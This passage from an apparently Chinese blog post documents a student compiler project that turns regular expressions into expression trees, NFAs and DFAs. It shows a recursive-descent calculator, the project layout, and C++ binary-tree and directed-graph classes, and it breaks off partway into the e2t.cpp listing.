class="comment">//遭遇括号,括号里面的视为表达式扔给顶层</span></span><br><span class="line">        ++pos;</span><br><span class="line">        result=evalExpression();</span><br><span class="line">        <span class="keyword">if</span>(!isRightBracket(expression[pos]))&#123;<span class="comment">//顶层很自觉,只会处理加减式子,遇到右括号就会甩锅给中层,</span></span><br><span class="line">        <span class="comment">//中层也处理不了右括号,甩锅给下层,而下层正好在这里等着右括号呢</span></span><br><span class="line">        <span class="comment">//如果底层命中右括号则没有错误,否则就说明从顶层到中层到底层下来的这个符号是个外星人,不熟,发生错误</span></span><br><span class="line">            Invalid=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++pos;<span class="comment">//到此说明右括号命中,pos++越过了右括号</span></span><br><span class="line">        <span class="keyword">return</span> result;<span class="comment">//必须立刻返回,因为底层的任务就是计算一个值,括号里的表达式的值算完了就应该返回了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//执行到此说明不是括号表达式,是纯数,纯数只需要从字符串提取成整数然后上交</span></span><br><span class="line">    <span class="keyword">while</span>(isDigit(expression[pos]))&#123;</span><br><span class="line">        buffer+=expression[pos];</span><br><span class="line">        ++pos;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    result=stod(buffer);</span><br><span class="line">    <span class="keyword">if</span>(isNegetive)&#123;<span class="comment">//一开始的时候激活了负数标记,此时就应该给result上负号</span></span><br><span class="line">        result*=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> text;</span><br><span class="line"><span class="type">double</span> result;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    text=<span class="string">&quot;1+2*3+(4+5)*6&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;calc(text)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="项目结构">项目结构</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/parser/parser]</span><br><span class="line">└─# tree</span><br><span class="line">.</span><br><span class="line">├── ds</span><br><span class="line">│   ├── Graph.cpp</span><br><span class="line">│   ├── Graph.h</span><br><span class="line">│   ├── Hash.cpp</span><br><span class="line">│   ├── Hash.h</span><br><span class="line">│   ├── Tree.cpp</span><br><span class="line">│   ├── Tree.h</span><br><span class="line">│   ├── Trie.cpp</span><br><span class="line">│   └── Trie.h</span><br><span class="line">├── e2t</span><br><span class="line">│   ├── e2t.cpp</span><br><span class="line">│   └── e2t.h</span><br><span class="line">├── main</span><br><span class="line">├── main.cpp</span><br><span class="line">├── main.exe</span><br><span class="line">├── make.bat</span><br><span class="line">├── make.sh</span><br><span class="line">├── n2d</span><br><span class="line">│   ├── DFA.cpp</span><br><span class="line">│   ├── DFA.H</span><br><span class="line">│   ├── DFA.md</span><br><span class="line">│   ├── epsilon.cpp</span><br><span class="line">│   ├── n2d.cpp</span><br><span class="line">│   └── n2d.h</span><br><span class="line">├── objects</span><br><span class="line">│   ├── AC.o</span><br><span class="line">│   ├── e2t.o</span><br><span class="line">│   ├── Graph.o</span><br><span class="line">│   ├── t2n.o</span><br><span class="line">│   ├── Tree.o</span><br><span class="line">│   └── Trie.o</span><br><span class="line">├── README.md</span><br><span class="line">├── swj.cpp</span><br><span class="line">└── t2n</span><br><span class="line">    ├── t2n.cpp</span><br><span class="line">    └── t2n.h</span><br></pre></td></tr></table></figure>
<p>采用管道过滤器模式</p>
<p>ds包括二叉树,图等基础数据结构,用作基类</p>
<p>e2t模块构建表达式树,该模块接收一个string类型,输出一个Tree类型</p>
<p>t2n模块构建NFA,该模块接收一个Tree类型,输出一个NFA类型</p>
<p>n2d模块构建DFA(正在此处),该模块接收一个NFA,输出一个DFA</p>
<p>DFA最小化(未完成),该模块接收一个DFA,输出一个最小化DFA</p>
<p>main.cpp是入口点</p>
<p>make.sh和make.bat为编译链接脚本,目前还不会使用makefile</p>
<h2 id="ds">ds</h2>
<h3 id="二叉树">二叉树</h3>
<h4 id="tree.h">Tree.h</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;string&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line">    TreeNode *left, *right;</span><br><span class="line">    <span class="type">bool</span> <span class="title function_">isCharacter</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">char</span> <span class="title function_">getOp</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// TreeNode(char );</span></span><br><span class="line">    TreeNode(<span class="type">char</span> c = <span class="string">&#x27;\0&#x27;</span>, TreeNode *l = <span class="literal">NULL</span>, TreeNode *r = <span class="literal">NULL</span>) ;</span><br><span class="line">    <span class="comment">// TreeNode(char ,TreeNode *,TreeNode *);</span></span><br><span class="line">    friend <span class="built_in">std</span>::ostream &amp;operator&lt;&lt;(<span class="built_in">std</span>::ostream &amp;, <span class="type">const</span> TreeNode &amp;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">    TreeNode *root;</span><br><span class="line">    <span class="type">void</span> <span class="title function_">inOrder</span><span class="params">(TreeNode *)</span>;</span><br><span class="line">    <span class="type">void</span> <span class="title function_">postOrder</span><span class="params">(TreeNode *)</span>;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    Tree(TreeNode *o=<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">void</span> <span class="title function_">inOrder</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">void</span> <span class="title function_">postOrder</span><span class="params">()</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="tree.cpp">Tree.cpp</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Tree.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">TreeNode::<span class="built_in">TreeNode</span>(<span class="type">char</span> c, TreeNode *l, TreeNode *r) : <span class="built_in">op</span>(c), <span class="built_in">left</span>(l), <span class="built_in">right</span>(r) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">TreeNode::isCharacter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> left==<span class="literal">NULL</span>&amp;&amp;right==<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">TreeNode::getOp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> op;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os, <span class="type">const</span> TreeNode &amp;o)</span><br><span class="line">&#123;</span><br><span class="line">    os &lt;&lt; o.op;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Tree::inOrder</span><span class="params">(TreeNode *o)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">inOrder</span>(o-&gt;left);</span><br><span class="line">    cout &lt;&lt; (*o) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">inOrder</span>(o-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Tree::postOrder</span><span class="params">(TreeNode *o)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">postOrder</span>(o-&gt;left);</span><br><span class="line">    <span class="built_in">postOrder</span>(o-&gt;right);</span><br><span class="line">    cout &lt;&lt; (*o) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Tree::<span class="built_in">Tree</span>(TreeNode *o ) : <span class="built_in">root</span>(o) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Tree::inOrder</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">inOrder</span>(root);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Tree::postOrder</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">postOrder</span>(root);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="有向图">有向图</h3>
<h4 id="graph.h">Graph.h</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxn 100000</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">GraphEdge</span>&#123;</span><br><span class="line">    <span class="type">int</span> from;</span><br><span class="line">    <span class="type">int</span> to;</span><br><span class="line">    <span class="type">char</span> character;</span><br><span class="line">    <span class="built_in">GraphEdge</span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">char</span>);</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setValue</span><span class="params">(<span class="type">int</span>,<span class="type">int</span>,<span class="type">char</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getTo</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">friend</span> std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;,<span class="type">const</span> GraphEdge&amp;);</span><br><span class="line">    <span class="function"><span class="type">char</span> <span class="title">getCharacter</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">GraphNode</span>&#123;</span><br><span class="line">    <span class="comment">// int id;</span></span><br><span class="line">    <span class="type">bool</span> isEnd;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; postEdges;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;)</span></span>;</span><br><span class="line">    <span class="built_in">GraphNode</span>();</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">end</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">friend</span> std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;,<span class="type">const</span> GraphNode&amp;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Graph</span>&#123;</span><br><span class="line">    GraphEdge edges[maxn];</span><br><span class="line">    GraphNode nodes[maxn];</span><br><span class="line">    <span class="type">int</span> cnt_edges;</span><br><span class="line">    <span class="type">int</span> cnt_nodes;</span><br><span class="line">    <span class="comment">// std::vector&lt;GraphEdge&gt; edges;</span></span><br><span class="line">    <span class="comment">// std::vector&lt;GraphNode&gt; nodes;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">int</span> finish;</span><br><span class="line">    <span class="built_in">Graph</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">newEdge</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;f,<span class="type">const</span> <span class="type">int</span> &amp;t,<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">newNode</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">info</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="graph.cpp">Graph.cpp</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Graph.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/// @brief GraphEdge构造函数</span></span><br><span class="line"><span class="comment">/// @param f from,起点</span></span><br><span class="line"><span class="comment">/// @param t to,终点</span></span><br><span class="line"><span class="comment">/// @param c character,本边上的字符</span></span><br><span class="line">GraphEdge::<span class="built_in">GraphEdge</span>(<span class="type">int</span> f=<span class="number">0</span>,<span class="type">int</span> t=<span class="number">0</span>,<span class="type">char</span> c=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">    from=f;</span><br><span class="line">    to=t;</span><br><span class="line">    character=c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GraphEdge::setValue</span><span class="params">(<span class="type">int</span> f=<span class="number">0</span>,<span class="type">int</span> t=<span class="number">0</span>,<span class="type">char</span> c=<span class="string">&#x27;\0&#x27;</span>)</span></span>&#123;</span><br><span class="line">    from=f;</span><br><span class="line">    to=t;</span><br><span class="line">    character=c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GraphEdge::getTo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> to;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">GraphEdge::getCharacter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> character;</span><br><span class="line">&#125;</span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os,<span class="type">const</span> GraphEdge &amp;edge)&#123;</span><br><span class="line">    <span class="keyword">if</span>(edge.character==<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        os&lt;&lt;edge.from&lt;&lt;<span class="string">&quot;----&gt;&quot;</span>&lt;&lt;edge.to;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        os&lt;&lt;edge.from&lt;&lt;<span class="string">&quot;--\&quot;&quot;</span>&lt;&lt;edge.character&lt;&lt;<span class="string">&quot;\&quot;--&gt;&quot;</span>&lt;&lt;edge.to;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GraphNode::<span class="built_in">GraphNode</span>()&#123; </span><br><span class="line">    isEnd=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GraphNode::addEdge</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;e)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    postEdges.<span class="built_in">push_back</span>(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GraphNode::end</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> isEnd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os,<span class="type">const</span> GraphNode &amp;node)&#123;<span class="comment">//stub</span></span><br><span class="line">    os&lt;&lt;<span class="string">&quot;node&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Graph::<span class="built_in">Graph</span>()&#123;</span><br><span class="line">    start=finish=<span class="number">0</span>;</span><br><span class="line">    cnt_edges=cnt_nodes=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Graph::newEdge</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;f,<span class="type">const</span> <span class="type">int</span> &amp;t,<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span>&#123;</span><br><span class="line">    ++cnt_edges;</span><br><span class="line">    edges[cnt_edges].<span class="built_in">setValue</span>(f,t,c);</span><br><span class="line">    <span class="keyword">return</span> cnt_edges;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Graph::newNode</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ++cnt_nodes;</span><br><span class="line">    <span class="keyword">return</span> cnt_nodes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::info</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=cnt_nodes;++i)&#123;</span><br><span class="line">        cout&lt;&lt;i&lt;&lt;<span class="string">&quot;((&quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;))&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=cnt_edges;++i)&#123;</span><br><span class="line">        cout&lt;&lt;edges[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="e2t">e2t</h2>
<p>expression to tree</p>
<p>给定一个正规式,构造其表达式树</p>
<p>正规式中包含操作数都是单个字母,运算符有:</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>符号</th>
<th>优先级</th>
</tr>
</thead>
<tbody>
<tr>
<td>括号</td>
<td><code>()</code></td>
<td>最高</td>
</tr>
<tr>
<td>闭包</td>
<td><code>*</code></td>
<td>次高</td>
</tr>
<tr>
<td>连接</td>
<td><code>.</code></td>
<td>次低</td>
</tr>
<tr>
<td>或</td>
<td><code>|</code></td>
<td>最低</td>
</tr>
</tbody>
</table>
<p>都是左结合运算,其中</p>
<p>连接,或,都是二元运算符</p>
<p>星闭包是一元运算符,操作数在左</p>
<p>比如<code>a|(b.c)*|d.e</code>对应的表达式树就是:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\XDcompAT&gt;run-compat.bat RE-TREE <span class="string">&quot;a|(bc)*|de&quot;</span> -g</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221018113058098.png"
alt="image-20221018113058098" />
<figcaption aria-hidden="true">image-20221018113058098</figcaption>
</figure>
<p>右边这个图,每个节点最多往下分两个叉,因此可以用二叉树实现,只有闭包运算这里是只有一个儿子的,可以作为二叉树节点的左儿子,右儿子为空</p>
<h3 id="e2t.h">e2t.h</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../ds/Tree.h&quot;</span></span></span><br><span class="line"><span class="comment">//以下函数都是测试字符性质</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isOr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isJoin</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isClosure</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLeftBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isRightBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEnd</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span> <span class="title function_">getCurrentOperator</span><span class="params">()</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isAlpha</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isCharacter</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isNull</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isSpace</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;)</span>;</span><br><span class="line">TreeNode *<span class="title function_">evalOr</span><span class="params">()</span>;</span><br><span class="line">TreeNode *<span class="title function_">evalJoin</span><span class="params">()</span>;</span><br><span class="line">TreeNode *<span class="title function_">evalClosure</span><span class="params">()</span>;</span><br><span class="line">Tree <span class="title function_">getTree</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;)</span>;</span><br></pre></td></tr></table></figure>
<h3 id="e2t.cpp">e2t.cpp</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 